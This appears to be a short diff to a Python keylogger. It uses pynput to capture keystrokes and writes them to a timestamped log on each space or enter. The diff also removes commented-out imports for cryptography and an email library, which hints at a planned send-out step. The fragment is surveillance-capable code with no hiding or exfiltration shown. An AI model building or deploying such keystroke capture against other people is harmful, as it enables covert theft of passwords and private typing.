@@ -1,8 +1,5 @@
 from pynput.keyboard import Key, Listener
-# import cryptography
-# import yagmail
 import datetime
-import time
 
 pressed_keys = []
 log_dict = {}
@@ -16,8 +13,7 @@ def on_press(key):
         for time, value in log_dict.items():
              print(time + '\n' + '  ' + value)
 
-    if len(pressed_keys) >= 10:
-        count = 0
+    if pressed_keys[-1]==Key.space or pressed_keys[-1]==Key.enter:
         write_file(pressed_keys)
         pressed_keys = []
 
@@ -44,7 +40,6 @@ def write_file(keys):
     else:
         log_dict[now] = data_str
     print(log_dict)
-
 
 def on_release(key):
     if key == Key.esc:
